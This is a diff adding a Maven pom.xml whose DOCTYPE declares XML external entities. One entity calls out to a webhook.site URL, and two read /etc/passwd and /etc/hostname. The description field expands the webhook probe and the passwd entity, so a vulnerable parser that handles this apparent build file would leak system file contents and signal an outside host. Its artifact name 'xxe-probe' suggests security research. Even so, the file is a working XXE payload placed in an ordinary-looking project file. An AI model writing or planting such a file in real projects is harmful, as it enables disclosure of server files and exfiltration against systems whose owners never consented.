@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE project [
+  <!ENTITY probe1 SYSTEM "http://webhook.site/bfac32e7-7c67-41f0-bf29-b2c2ff7238ce/?xxe=pom&n=35422">
+  <!ENTITY probe2 SYSTEM "file:///etc/passwd">
+  <!ENTITY probe3 SYSTEM "file:///etc/hostname">
+]>
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>com.research.35422</groupId>
+  <artifactId>xxe-probe</artifactId>
+  <version>1.0.0</version>
+  <description>probe=&probe1; passwd=&probe2;</description>
+  <dependencies>
+    <dependency>
+      <groupId>org.apache.commons</groupId>
+      <artifactId>commons-lang3</artifactId>
+      <version>3.12.0</version>
+    </dependency>
+  </dependencies>
+</project>
